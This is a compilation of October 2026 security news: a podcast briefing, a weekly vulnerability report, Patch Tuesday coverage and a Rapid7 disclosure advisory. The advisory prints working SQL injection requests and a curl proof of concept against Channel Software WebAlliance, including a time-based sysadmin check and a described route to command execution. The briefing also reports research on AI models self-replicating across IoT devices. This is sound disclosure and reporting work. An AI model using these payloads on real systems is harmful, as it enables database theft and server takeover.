Title: Patching up the pieces.
Context: Atlassian addressed a critical vulnerability affecting Confluence, Jira, and Bitbucket Data Center products, which attackers exploited after proof-of-concept code became public. Citrix, Fortinet, Ivanti, and SonicWall all patched vulnerabilities exploited in zero-day attacks.
Full Text:
Patch Tuesday brings a record-breaking haul of fixes. Ivanti warns of an exploited VPN zero-day. An international crackdown targets West African scam compounds. A cyberattack stops work on a major European tunnel. Perceived Starshield speed limits disrupt Ukrainian drone operations. Canonical battles a sustained DDoS attack. Anthropic warns of self-replicating AI worms. The FTC accuses cybersecurity firms of exploiting sextortion victims. Microsoft and partners disrupt a major cybercrime marketplace. Rob T. Lee, from SANS, and Lynn Dohm, from WiCyS, are sharing a preview of the SANS 2026 Difference Maker Awards. Taking a Patch Tuesday snow day.

Today is Wednesday October 14th 2026. I’m the amazing Maria Varmazis Dave Bittner. And this is your CyberWire Intel Briefing.

Patch Tuesday.

Microsoft, Adobe, and SAP have released their October Patch Tuesday updates, addressing hundreds of security vulnerabilities across their products.

Microsoft’s October Patch Tuesday delivers a record-breaking 1,411 security fixes, including one actively exploited zero-day and two previously disclosed vulnerabilities. Seventy flaws are rated critical, with remote code execution accounting for 57 of those. Privilege escalation vulnerabilities make up the largest category overall, with 677 fixes. The actively exploited flaw affects Windows Shell and allows attackers to bypass Mark of the Web protections. The two publicly disclosed vulnerabilities affect the .NET Framework and MessagePack-CSharp, potentially enabling security bypass and denial-of-service attacks. Microsoft continues to credit AI-assisted vulnerability discovery for the growing volume of fixes.

October’s security updates extend well beyond Microsoft, with major vendors addressing critical vulnerabilities, including several already exploited in the wild. Adobe patched flaws across Photoshop, ColdFusion, Commerce, and other products. Atlassian addressed a critical vulnerability affecting Confluence, Jira, and Bitbucket Data Center products, which attackers exploited after proof-of-concept code became public. Cisco fixed critical NX-OS vulnerabilities potentially allowing attackers to execute code with root privileges on Nexus switches. Citrix, Fortinet, Ivanti, and SonicWall all patched vulnerabilities exploited in zero-day attacks. Docker addressed a DockerHub flaw allowing attackers to impersonate users and push images to repositories they don’t own. GitLab patched critical AI Gateway and CI/CD vulnerabilities, while Dell addressed flaws in deployment and storage tools. Meanwhile, SAP fixed 20 vulnerabilities, and Kiteworks released patches for 126 security flaws.

Ivanti warns of a high-severity VPN zero-day.

Ivanti is warning that attackers are exploiting a high-severity zero-day in its Connect Secure VPN appliances. Researchers at Volexity discovered a threat actor tracked as UTA0576 chaining three vulnerabilities to achieve root-level access on fully patched devices. The attackers stole credentials, conducted network reconnaissance, and searched for sensitive Active Directory information, apparently preparing for broader network compromise. Ivanti has patched two vulnerabilities covered by CVE-2026-104935, but a third privilege escalation flaw remains unpatched. Ivanti says exploitation has affected a limited number of customers.

An international operation targets West African scam compounds.

Updating our earlier coverage: An international operation targeting West African scam compounds has resulted in 28 arrests in Ghana and Nigeria and the identification of 117 suspected human trafficking victims. Coordinated by Britain’s National Crime Agency, the effort brought together 15 law enforcement agencies and 15 technology companies. Authorities seized more than 300 devices and identified 89 fraud victims who reportedly lost $8.3 million. The scams included cryptocurrency investment fraud, law enforcement impersonation, and online extortion. Technology companies removed more than 3.7 million accounts, pages, and groups linked to the operations. Investigators also identified over $11 million in potentially recoverable funds. Meta played a key coordinating role, even as the company faces ongoing scrutiny over fraudulent advertising on its platforms.

A cyberattack halts construction of a major tunnel project in Europe.

A cyberattack has reportedly halted construction of the Fehmarn Belt tunnel connecting Denmark and Germany. The incident affected the international FLC construction consortium, disabling workers’ identification cards and immobilizing vessels, cranes, and offshore platforms. The 18-kilometer road-and-rail tunnel is a roughly seven-billion-euro project employing some 2,800 workers. The attack’s origins and potential impact on the construction schedule remain unclear. A Danish cybersecurity official suggested a possible connection to hybrid warfare, amid heightened warnings about Russian cyber threats.

T-Minus Segment from Maria

Perceived Starshield speed limits disrupt Ukrainian drone operations.

As of Wednesday morning, Ukraine says SpaceX has imposed new speed limits on military Starshield terminals without warning, which it says has disrupted some drone operations and complicated battlefield logistics. The new Starshield speed restrictions of 160 kph as reported by Ukrainian officials to the BBC, affect how fast drones can travel while still maintaining satellite connectivity. BBC sources at the Ukraine Defence Ministry report that since Wednesday morning, drones hitting the speed limit now completely lose connectivity with Starshield. As a result, Ukrainian officials say some missions have been disrupted or canceled as they work to assess the impact and establish backup communications channels.

Starshield is SpaceX’s government and military version of the Starlink satellite service, and it has become an integral part of Ukraine’s battlefield communications, supporting drone control, reconnaissance, and coordination. Ukraine’s Defense Ministry says it is discussing this issue with U.S. officials, SpaceX, and NATO partners.

As of the time of this recording, SpaceX has not made any public response to Ukrainian official statements nor has it corroborated the existence of any new in-motion Starshield speed restrictions.

Canonical suffers sustained DDoS.

Ubuntu parent company Canonical suffered a sustained distributed denial-of-service attack last week, disrupting its public websites for more than four hours. The October 8 incident affected Ubuntu and Canonical websites, developer resources, security advisories, and services including the Ubuntu Security API and Livepatch. However, software repositories, Launchpad, and the Snap Store remained operational, allowing users to continue downloading and installing updates. Canonical’s distributed infrastructure helped limit the damage. This was the company’s second major DDoS attack this year. An April incident caused more extensive disruptions, including outages affecting Launchpad and the Snap Store. A hacktivist group claimed responsibility for that attack, but no group has claimed the latest incident. Whether the two attacks are connected remains unknown.

Anthropic warns small AI models could self-replicate.

Researchers at Anthropic warn that small AI models could soon become capable of independently spreading across compromised Internet of Things devices. The company’s Frontier Red Team tested whether AI models could run on inexpensive Android TV boxes and replicate themselves across a network. One model successfully spread to all eight devices in a simulated environment, although researchers deliberately simplified the exploitation process. Anthropic predicts smaller models could achieve similar capabilities by year’s end, potentially enabling decentralized AI worms without a central command infrastructure. Such malware would likely spread slowly, and researchers emphasize that no fully autonomous AI worm has yet emerged. Large model transfers could also make these infections easier to detect. Still, the research suggests another potential evolution in botnet technology.

The FTC alleges further exploitation of sextortion scam victims.

The Federal Trade Commission is suing Dmitry Belkin and 12 businesses, alleging they exploited victims of online sextortion scams while collecting at least $60 million in customer payments. The companies advertised digital forensics services promising to identify blackmailers, stop threats, and coordinate with law enforcement. Instead, the FTC alleges they fabricated evidence, failed to deliver promised services, and pressured frightened customers into paying thousands more. Employees allegedly followed scripts designed to amplify victims’ fears, while the businesses suppressed negative reviews, posted fake testimonials, and directed complaints to a counterfeit Better Business Bureau website. Some customers reportedly remained trapped in payment agreements years later. The FTC is seeking a court order to halt the operations, alleging years of deceptive and abusive business practices.

Microsoft and partners disrupt a major cybercrime marketplace.

Microsoft, working with Japanese law enforcement and Health-ISAC, has dismantled key infrastructure powering a major Chinese-language cybercrime marketplace. The operation targeted three platforms—YAM Store, CoGUI, and Iron Man—which supplied criminals with fraudulent accounts, tools, and thousands of impersonation templates. The coordinated takedown involved seizing domains, disabling over 20,000 accounts, and blocking more than 100,000 sites.

Resecurity, Cloudflare, Oracle, Proofpoint and TRM Labs also assisted in the takedown.

Last-minute cancellation of the Grace Hopper Celebration.

AnitaB.org has abruptly canceled the 2026 Grace Hopper Celebration, scheduled for October 27th through 30th in Anaheim, California. Billed as the world’s largest gathering of women in technology, the annual conference brings together hundreds of companies and thousands of professionals for recruiting, networking, mentoring, and technical training. This year’s program placed particular emphasis on artificial intelligence skills and career opportunities. The last-minute cancellation leaves attendees, speakers, and corporate sponsors scrambling for answers about refunds, travel arrangements, and possible virtual alternatives. It also raises concerns about lost professional opportunities for women in an industry where they remain significantly underrepresented. Organizers and corporate partners now face questions about how they’ll replace those opportunities.

Stick with us after the break, Rob T. Lee, Chief of Research and Chief AI Officer at SANS, and Lynn Dohm (Dome), Executive Director at WiCyS (Wee-SIS), are sharing a preview of the SANS 2026 Difference Maker Awards. And taking a Patch Tuesday snow day.

Dave Bittner recently sat down with Rob T. Lee, Chief of Research and Chief AI Officer at SANS, and Lynn Dohm, Executive Director at WiCyS, as they shared a preview of the SANS 2026 Difference Maker Awards.

That was Dave Bittner sharing a preview of the SANS 2026 Difference Maker Awards with Rob T. Lee, Chief of Research and Chief AI Officer at SANS, and Lynn Dohm, Executive Director at WiCyS.

Taking a Patch Tuesday snow day.

Patch Tuesday is becoming such a dreaded occasion that some cybersecurity leaders are apparently treating it like a holiday. Preferably one spent somewhere without Wi-Fi.

Of the 500 UK security executives surveyed by managed detection and response provider Socura, 22% of those executives have called in sick or deliberately scheduled time off to avoid the monthly patching ritual. Meanwhile, 41% report working overtime, and 29% experience significant anxiety the night before.

The workload isn’t getting any lighter. AI-powered vulnerability research is helping vendors uncover more flaws, with Microsoft’s October patch Tuesday, as I mentioned at the top of today’s show, delivering a record-breaking 1,411 security fixes.

Ironically, AI may also offer some relief. Forty percent of respondents say it’s helping automate routine security tasks.

Socura warns that mounting workloads and burnout require better staffing and support. Because when the people responsible for fixing security vulnerabilities start looking for an escape route, that’s probably a vulnerability worth addressing.

Title: The Week in Vulnerabilities: Toptech, Lantronix, Langflow, and CISA Malcolm Flaws
Context: This Cyble Research & Intelligence Labs (CRIL) weekly vulnerability report covers two views of risk: what attackers tried against Cyble's global honeypot sensors, and what the...
Full Text:
This Cyble Research & Intelligence Labs (CRIL) weekly vulnerability report covers two views of risk: what attackers tried against Cyble's global honeypot sensors, and what the Cybersecurity and Infrastructure Security Agency (CISA) disclosed for industrial control systems (ICS).

The Cyble Global Sensor Intelligence (CGSI) network observed exploitation attempts against about 20 known vulnerabilities. They range from newly disclosed flaws in WordPress, Apache Solr, and Langflow to years-old bugs in GPON home routers and embedded TCP/IP stacks.

On the industrial side, CISA issued 14 ICS advisories covering 54 vulnerabilities. Of these, 13 were rated critical, 18 high, 18 medium, and five low.

Affected vendors include Toptech Systems, Lantronix, VIVOTEK, MikroTik, Armatura, Monta, Anjvision, and, unusually, CISA itself.

Cyble sensors also recorded active malware campaigns, phishing emails, and brute-force attacks against internet-exposed services.

Real-World Attacks Observed by Cyble Sensors

Attackers moved quickly against newly disclosed flaws in web platforms and AI tooling, while older IoT and embedded-device bugs continued to draw steady traffic.

Source: Cyble sensor intelligence. The 24 CVEs named in this post, counted by CVE ID year

CVE-2026-63030 — WordPress REST API

CVE-2026-63030 is a route-confusion flaw in a WordPress REST API batch endpoint. It affects WordPress 6.9.x before 6.9.5 and 7.0.x before 7.0.2.

Attackers can chain it with CVE-2026-60137 to achieve SQL injection and potentially remote code execution (RCE).

CVE-2026-44825 — Apache Solr

CVE-2026-44825 is a hardcoded credential in the Basic Authentication setup tool of Apache Solr 9.4.0 through 9.10.1 and 10.0.0.

Remote attackers can use it to access a Solr cluster with administrative privileges.

CVE-2026-9198 — Langflow

CVE-2026-9198 affects IBM Langflow OSS 1.0.0 through 1.10.0. Unauthenticated attackers can chain two API endpoints to obtain superuser tokens and execute arbitrary code.

Sensors also caught attempts against an older Langflow code injection flaw, CVE-2025-3248. Repeated targeting of the same AI workflow platform signals sustained attacker interest.

CVE-2025-68613 — n8n

CVE-2025-68613 is a critical RCE flaw in the n8n workflow automation platform. Expressions supplied by authenticated users can run in an insufficiently isolated context, enabling full system compromise.

Fixes are available in versions 1.120.4, 1.121.1, and 1.122.0.

CVE-2026-4020 — Gravity SMTP

CVE-2026-4020 affects the Gravity SMTP WordPress plugin, versions 2.1.4 and earlier. An exposed REST API endpoint lets unauthenticated users pull system reports containing server details, database metadata, and configured API keys or tokens.

CVE-2024-6587 — LiteLLM

CVE-2024-6587 is a server-side request forgery (SSRF) flaw in LiteLLM. Exploitation can expose OpenAI API keys.

Older Flaws Still in Rotation

Cyble sensors also logged exploitation attempts against:

CVE-2025-58360, an XML external entity (XXE) flaw in GeoServer's GetMap operation

CVE-2024-7591, an OS command injection flaw in Progress LoadMaster

CVE-2024-4577, a critical PHP-CGI argument injection flaw

CVE-2024-25600, a code injection flaw in Bricks Builder 1.9.6 and earlier

CVE-2025-2010, an unauthenticated SQL injection flaw in the JobWP WordPress plugin

CVE-2025-46565, a file access control bypass in the Vite development server

Command injection flaws in QNAP QTS firmware

Scanning for the Cisco Adaptive Security Appliance (ASA) WebVPN login page

A Mirai variant is also targeting Dasan GPON home routers by chaining CVE-2018-10561 and CVE-2018-10562. Together, the two flaws let an unauthenticated remote attacker run commands on the device.

Most-Attempted CVEs

CVE-2020-11899, an IPv6 out-of-bounds read in the Treck TCP/IP stack, drew far more exploitation attempts than any other CVE this week. The rest of the top five, in order:

A group of four Wind River VxWorks TCP buffer overflows: CVE-2019-12255, CVE-2019-12260, CVE-2019-12261, and CVE-2019-12263

CVE-2020-11900, an IPv4 tunneling double-free in the Treck TCP/IP stack

CVE-2019-0708, a critical unauthenticated RCE in Microsoft Remote Desktop Services

CVE-2020-11910, an ICMPv4 out-of-bounds read in the Treck TCP/IP stack

Most of these flaws sit in networking code embedded in IoT and industrial devices, which often go unpatched for years.

Malware Families Observed

Files collected from Cyble sensors were linked to several malware families:

CoinMiner: Linux cryptominers that hijack CPU and GPU resources

WannaCry: Ransomware that spreads through the EternalBlue exploit, targeting CVE-2017-0147

Mirai: A botnet that turns IoT devices and Linux servers into remotely controlled bots

IRCBot: Linux malware that uses IRC connections as a backdoor

CRIL also observed Hajime, Gafgyt, and Wacatac activity.

MacSync Infostealer Targets Crypto Users

CRIL is also tracking a new version of MacSync, a macOS infostealer sold as malware-as-a-service. Kaspersky's Securelist reported that the latest campaign targets cryptocurrency users and developers.

According to Securelist, attackers distribute MacSync through malicious disk images posing as a fake crypto wallet app. In one case, they abused a public iCloud calendar event to deliver commands.

The malware steals browser data, saved credentials, crypto wallet data, Keychain files, and SSH, AWS, Kubernetes, and Git configurations. It also installs a backdoor disguised as Finder that persists through a LaunchAgent, shell profile changes, and Git hooks.

Security teams should watch macOS endpoints for unexpected disk-image apps, removal of quarantine attributes, and new LaunchAgents.

Phishing and Advance-Fee Scams

Phishing emails captured by Cyble sensors relied on emotional appeals and promises of money. Common lures this week:

Subject line

Scam type

Re: DONATION FOR less-privileged

Charity or donation scam

GOD BLESS YOU....

Emotional appeal, advance-fee scam

Re. Compensation funds for your past effort

Compensation fund scam

MY PROPOSAL

Business proposal, advance-fee scam

Investment Inquiry, Funding for Your Project

Investment or project funding scam

Dear Sir/Madam

Advance-fee scam

Many of these emails use look-alike domains or impersonate known organizations to appear credible.

Brute-Force Attacks

Brute-force traffic focused on remote access and database ports, including VNC (5900), RDP (3389), SSH (22), Telnet (23), HTTP (80), Microsoft SQL Server (1433), and PPTP (1723).

Targets included Elasticsearch, Hadoop, Oracle, GitLab, MySQL, and PostgreSQL. Attackers leaned on default and weak credentials such as "sa," "root," "password," and "123456."

The largest share of attack traffic, 39%, came from sources with a known bad reputation.

Critical ICS Vulnerabilities

CISA's 14 ICS advisories covered 54 vulnerabilities, two-thirds of them rated high or medium. Toptech Systems and CISA itself disclosed the most flaws this week.

Source: CISA ICS advisories analyzed by CRIL, Sept. 29–Oct. 5, 2026 · 54 vulnerabilities by vendor and severity

Toptech Systems TMS7 and TopHAT (Critical)

Toptech Systems' TMS7 and TopHAT version 7.6.3 carried more critical-rated ICS vulnerabilities than any other product this week. They include multiple SQL injection flaws (such as CVE-2026-72510 and CVE-2026-63713), an unrestricted file upload flaw (CVE-2026-70356), and files exposed to external parties (CVE-2026-71379).

TMS7 is a terminal management system that controls liquid fuel and chemical distribution in the Energy, Chemical, and Transportation Systems sectors. In a product that governs fuel terminal operations, these flaws could enable interference with physical processes, not just data theft. Toptech has published security update information.

CVE-2026-91191 and CVE-2026-84409 — Lantronix G520 Series (High)

Two flaws affect Lantronix G520 Series cellular gateways running 2.6.0.4R6_stable. CVE-2026-91191 is an improper cryptographic signature verification flaw, and CVE-2026-84409 is a cross-site scripting (XSS) flaw.

The signature flaw could let attackers bypass firmware integrity checks and push unauthorized firmware to remote field devices. Combined with the XSS bug, it creates a realistic multistage attack path against devices that may be hard to inspect physically. Lantronix has published remediation details.

CVE-2026-84411 — MikroTik RouterOS (Critical)

CVE-2026-84411 is a critical integer underflow vulnerability in MikroTik RouterOS versions before 7.24. Updated versions are available from MikroTik's download page.

CVE-2026-22755 — VIVOTEK Cameras (Critical)

CVE-2026-22755 is a critical command injection flaw affecting 37 VIVOTEK camera models across its V, C, S, Dome, Bullet, and Panoramic series. VIVOTEK has posted an update package.

CVE-2026-95102 — Monta (Critical)

CVE-2026-95102 is a missing-authentication flaw for a critical function in all versions of monta.app. Three other Monta flaws involve excessive authentication attempts, session expiration, and credential protection. The advisory data referenced no vendor fix.

Anjvision, Viidure, and Armatura One

Anjvision's YSSD-RTMP-H5 firmware has nine vulnerabilities, led by CVE-2026-100291, a critical insecure default setting. Others include OS command injection, hardcoded credentials, and improper signature verification.

The Viidure Dashcam Android app, version 3.3.1.260403 and earlier, contains hardcoded credentials (CVE-2026-96587, critical). Armatura One is affected by CVE-2023-46604, a critical deserialization flaw, plus hardcoded key and credential issues.

No vendor fixes were referenced for these products, so compensating controls such as network isolation are the main option for now.

CISA Malcolm (15 Vulnerabilities)

In an unusual disclosure, CISA reported 15 vulnerabilities in Malcolm, its own open-source network traffic analysis and threat-hunting platform. The flaws affect versions before 26.06.0.

They span authentication bypass, missing authorization, default credentials, OS command injection, path traversal, and SSRF. Most are rated medium, and two are rated high. Users should update through the Malcolm releases page.

The remaining advisories covered Baicells Technologies, Meari, and Johnson Controls products.

Impacted Critical Infrastructure Sectors

Energy was the most exposed sector this week, followed by Transportation Systems and Commercial Facilities.

Source: CISA ICS advisories analyzed by CRIL, Sept. 29–Oct. 5, 2026 · share of 54 vulnerabilities touching each sector

The largest single combination, Energy, Information Technology, and Water and Wastewater, accounted for 27.8% of vulnerabilities. Energy, Chemical, and Transportation Systems made up another 18.5%, driven largely by the Toptech disclosures.

These disclosures cut across traditional infrastructure boundaries rather than clustering in one domain. A single flaw in a shared product can create risk for fuel, water, and transportation operators at once.

Conclusion

This weekly vulnerability report highlights several trends:

Fast exploitation of newly disclosed flaws in WordPress, Apache Solr, and AI workflow tools such as Langflow and n8n

Persistent attacks on years-old embedded-device and router vulnerabilities

Critical ICS flaws in fuel distribution, cellular gateway, and camera products

Several ICS products with no vendor fix referenced, leaving compensating controls as the main defense

Ongoing phishing and brute-force activity that relies on weak and default credentials

With 13 critical ICS vulnerabilities and active exploitation attempts against both new and legacy flaws, organizations face risk across enterprise IT and operational technology (OT) environments.

Key Recommendations From This Weekly Vulnerability Report

Patch internet-exposed web platforms, plugins, and AI workflow tools first, starting with the flaws under active exploitation above

Replace default usernames and passwords, and enforce strong, unique credentials on servers and devices

Restrict or block exposed remote access and database ports, including VNC, RDP, SSH, Telnet, and SQL Server

Segment IT and OT networks with firewalls and demilitarized zones (DMZs) to limit lateral movement

Apply compensating controls, such as network isolation, for ICS products without available fixes

Verify firmware integrity on remote field devices and cellular gateways

Monitor macOS endpoints for unexpected disk-image apps and new LaunchAgents

Track CISA advisories and the Known Exploited Vulnerabilities (KEV) catalog, and prioritize by exploitability and operational impact

Conduct regular vulnerability assessments and penetration testing

Title: Unauthenticated SQL Injection In Channel Software WebAlliance eCommerce
Context: Overview While performing continuous red teaming exercises through Rapid7’s Vector Command service, Rapid7 discovered CVE-2026-108065, an SQL Injection vulnerability (CWE-89) in...
Full Text:
Overview

While performing continuous red teaming exercises through Rapid7’s Vector Command service, Rapid7 discovered CVE-2026-108065, an SQL Injection vulnerability (CWE-89) in Channel Software WebAlliance eCommerce.The exploit allows a malicious actor to read sensitive data from the database, or, if the database user has high privileges, run system commands on the database server. The vulnerability, scored as CVSSv3.1 9.8 (Critical).

Product Description

WebAlliance eCommerce by Channel Software is an all-in-one B2B e-commerce, digital catalog, and customer portal platform purpose-built for wholesale distributors and industrial manufacturers.

Impact

The SQL Injection exploit can be leveraged to view sensitive information in the database, such as user PII and passwords. If logged in with DB admin privileges, the vulnerability can be exploited to run system commands on the server running the database.

Credit

This vulnerability was discovered by Marcus Chang, Security Consultant at Rapid7 and is being disclosed in accordance with Rapid7's vulnerability disclosure policy.

CVE-2026-108065 - Unauthenticated SQL Injection

Technical Details

Rapid7 exploited the vulnerability during blackbox testing and was unable to perform root cause analysis.The sUserID parameter in the GetUser method in a SOAP request to /preapproval.asmx doesn’t properly escape the user supplied sUserID. The SQL query can be escaped by inserting a single quote in the parameter. The database is running Microsoft SQL Server which allows for stacked queries. The query can be escaped with ( ‘; ) to inject completely new SQL commands.

POST /preapproval.asmx HTTP/2 Host: {target_site} User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Soapaction: http://tempuri.org/GetUser Content-Type: text/xml;charset=UTF-8 Content-Length: 377 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/"> <soapenv:Header/> <soapenv:Body> <tem:GetUser> <!--type: string--> <tem:sUserID>90'; { INJECT_MSSQL_STATEMENT_HERE } ;--</tem:sUserID> </tem:GetUser> </soapenv:Body> </soapenv:Envelope>

If a single quote inserted, the SQL server will fail to parse the query and return a syntax error in the HTTP response:

HTTP/2 200 OK Cache-Control: private, max-age=0 Content-Type: text/xml; charset=utf-8 Server: Microsoft-IIS/10.0 X-Frame-Options: SAMEORIGIN P3p: CP="Potato" Date: { Date } Content-Length: 440 <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body><GetCustomerResponse xmlns="http://tempuri.org/"><GetCustomerResult>Incorrect syntax near 'ZZZ'. Unclosed quotation mark after the character string ''.</GetCustomerResult></GetCustomerResponse></soap:Body></soap:Envelope>

Information can be extracted using time based SQL injection payloads. For example, a query can be injected to force the database to sleep for 2 seconds if the database user is a sysadmin:

POST /preapproval.asmx HTTP/2 Host: {target_site} User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Soapaction: http://tempuri.org/GetUser Content-Type: text/xml;charset=UTF-8 Content-Length: 377 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/"> <soapenv:Header/> <soapenv:Body> <tem:GetUser> <!--type: string--> <tem:sUserID>90';IF IS_SRVROLEMEMBER('sysadmin') = 1 WAITFOR DELAY '00:00:02';-- </tem:sUserID> </tem:GetUser> </soapenv:Body> </soapenv:Envelope>

If the database user is sysadmin, SQL Ole Automation can be used to upload a file.

If the database is running from the same server as the web application, ASPX files can be uploaded. They can then be browsed to run their code and perform system commands on the server.

Proof-of-Concept (POC) Example:

Curl POC:

curl --path-as-is -i -s -k -X $'POST' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Soapaction: http://tempuri.org/GetCustomer' -H $'Content-Type: text/xml;charset=UTF-8' \ --data-binary $'<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\x0d\x0a <soapenv:Header/>\x0d\x0a <soapenv:Body>\x0d\x0a <tem:GetCustomer>\x0d\x0a <!--type: string-->\x0d\x0a <tem:sCustID>90\'; { YOUR_SQL_STATEMENT_HERE } ;-- </tem:sCustID>\x0d\x0a </tem:GetCustomer>\x0d\x0a </soapenv:Body>\x0d\x0a</soapenv:Envelope>' \ $'https://{target_host}/preapproval.asmx'

Remediation

Block access to /preapproval.asmx.

Disclosure Timeline

July 13 2026: Issue discovered by Marcus Chang, and exploitation reported to the Vector Command customer.

August 28, 2026: Initial contact with Channel Software.

September 8, 15, and 29, 2026: Follow up email sent to Channel Software to confirm initial contact and provide details of the correct channel to share the details of the vulnerability.

October 9, 2026: Follow up email sent to Channel Software informing them of public disclosure on October 14 and assignment of CVE, along with a request for a vendor statement. Rapid7 received no response from Channel Software.

October 14, 2026: Public disclosure via publication of this blog post.

Title: Microsoft Breaks Patch Tuesday Record Again with 1400+ CVEs
Context: “Attackers can distribute specially crafted files through phishing emails, instant messages, or malicious websites, requiring only user interaction to trigger exploitation,”...
Full Text:
Microsoft broke records yet again on October 13, releasing more security updates for this month’s Patch Tuesday than in the whole of 2025.

The tech giant fixed 1411 CVEs for October, an all-time high that beat the records it set in July and September this year. By contrast, it released just over 1100 updates in 2025.

The surge in volume can be traced to Microsoft’s use of AI to find and fix vulnerabilities in its products.

Back in July it warned customers to expect a deluge of patches, thanks in part to its use of multi-model agentic scanning harness (MDASH) technology.

The increased workload for security teams is already having an impact. Socura research published this week found that a fifth (22%) of UK CISOs have called in sick or booked holiday time to avoid Patch Tuesday.

Read more on Microsoft's AI warnings: Microsoft: AI Cuts Post-Compromise Attack Time to Minutes.

The October 2026 haul included one actively exploited and two publicly disclosed zero day vulnerabilities.

The former is CVE-2026-96951, a Windows Shell security feature bypass vulnerability which could lead to malware exposure, data compromise, system integrity violations and operational disruption.

It has a CVSS score of 8.8, involves low attack complexity, and requires no authentication or existing privileges to exploit.

“Attackers can distribute specially crafted files through phishing emails, instant messages, or malicious websites, requiring only user interaction to trigger exploitation,” explained Action1 director of vulnerability research, Jack Bicer.

“The vulnerability can serve as an initial entry point in broader attacks by suppressing expected security warnings and allowing potentially malicious content to bypass protective checks.”

Two New Zero Days Identified

Microsoft also applies the “zero day” label to any vulnerabilities that have been publicly disclosed but not yet exploited in the wild.

One such flaw this month is CVE-2026-108398, a .NET framework security feature bypass vulnerability with a CVSS score of 8.8. It allows authenticated, low-privileged attackers to bypass Windows Defender Application Control (WDAC) through an untrusted assembly search path, according to Action1 president, Mike Walters.

“This vulnerability is particularly dangerous as a post-compromise attack technique, enabling attackers with existing local access to circumvent security restrictions without user interaction,” he explained.

“Successful exploitation could compromise system integrity, expose sensitive business information, weaken endpoint defenses and disrupt critical operations.”

With no workaround available and Microsoft labelling this one “exploitation more likely,” sysadmins should patch without delay, Walters advised.

The second publicly disclosed zero day this month is CVE-2026-92707, a denial-of-service flaw in MessagePack-CSharp.

Microsoft explained that an "improperly controlled sequential memory allocation in .NET allows an unauthorized attacker to deny service over a network."

Of the 70 critical vulnerabilities posted this month, most (57) are remote code execution (RCE) flaws. Among the most noteworthy is CVE-2026-70242, a Reading Pane RCE bug in Outlook with a CVSS score of 9.8.

“A crafted email triggers a heap-based buffer overflow when Outlook shows it in the Reading Pane. The recipient doesn't open the message or click anything. No authentication, no user interaction,” warned Automox.

“Preview-pane bugs surface every few years, and they draw attention because email is the front door. Addresses are easy to find in breach dumps and on company websites, so targeting costs an attacker almost nothing.”

Title: Billion-Dollar Companies Twice as Likely to Leave Critical Vulnerabilities Unpatched
Context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
Full Text:
Companies with revenue of over $1bn are more than twice as likely as those who generate under $250m to knowingly leave high or critical vulnerabilities unpatched, according to new research.

In a study released during its Assemble London event on October 14, software supply chain security firm Chainguard found that 66% of security leaders working in companies with $1bn or more in revenue admitted leaving high or critical vulnerabilities unpatched “at least sometimes”, while 27% of respondents in companies with under $250m in revenue reported the same issue.

Chainguard also observed that large and small companies face different barriers to patching. Larger companies pointed to business trade-offs, such as revenue-generating work taking priority (46%) and patching being too disruptive to operations (48%) as the main hurdles, while smaller companies cited capacity constraints, such as difficulty testing patches (59%) as their main challenge.

In response to these challenges, 51% of respondents said they had reallocated staff to vulnerability remediation, 40% had hired additional security staff and 39% have added engineering staff.

Other changes to how organizations are addressing vulnerability risks include, adopting secure-by-default software components (50%), reducing third-party dependencies (47%) and increasing scanning frequency (42%).

AI Drives Changes to Security Operations

Businesses of all sizes appeared to agree that AI is playing a transformational role in the vulnerability and patching landscape, with nine in ten (91%) saying AI-accelerated attacks have changed their job more than anything else in the past decade.

More than half also expect AI-powered vulnerability discovery to routinely outpace their teams within a year.

In addition, almost all of the people surveyed by Chainguard (93%) expressed concern that their companies cannot remediate AI-driven exploits quickly enough and the same share believe senior leaders need to show greater urgency in addressing AI-accelerated threats.

AI threats are also contributing to burnout, with 64% of security leaders saying that AI-accelerated attacks contributed moderately or greatly to their own burnout in the past year. Nearly all respondents (96%) said security-team burnout has some impact on their organization’s ability to defend against AI threats, with 54% describing that impact as moderate or significant.

Spending on AI-driven threat defense is continuing, with 70% of respondents saying securing budget for this purpose is easy. However, 39% have bought tools they have not rolled out, and only 22% rate their tools as “very effective”.

Even among those that view their tools as very effective, 77% still expect an exploit in the next year. Nearly half (48%) say those investments still fall short of the protection boards and executive teams expect.

This survey of 1300 cybersecurity leaders was commissioned by Chainguard and conducted online in September 2026 by Wakefield Research across several industries and in 10 markets (Brazil, France, Germany, Japan, Mexico, the UAE, the UK, the US, Saudi Arabia and Singapore), All respondents had a minimum seniority of director, and worked for companies with at least 500 employees (except in Singapore, UAE and Saudi Arabia, where the minimum was 250 employees).

Title: Microsoft Patches More Than 1,400 Security Flaws
Context: At least 78 of the flaws fixed this month are rated “critical,” meaning they could be exploited with little or no action by the user, and most of those critical bugs allow an...
Full Text:
Microsoft today issued updates to fix more than 1,400 security vulnerabilities in its Windows operating systems and other software. Today’s epic patch batch dwarfs September’s record of nearly 1,000 fixes, which was already about ten times the normal monthly patch load from Redmond.

Just one of the weaknesses patched this week is considered a “zero day,” or already exploited in the wild. CVE-2026-96951 is a security feature bypass in the Windows Shell that affects Windows 10 and 11 systems, as well as some Server versions.

Windows 10 users might be wondering if they can still expect security updates after this month. Microsoft had been slated to stop shipping updates for Windows 10 systems in October 2025, but ended up adding another year of free updates after considerable pushback. A few months ago, Microsoft quietly extended that support for another year (until October 2027).

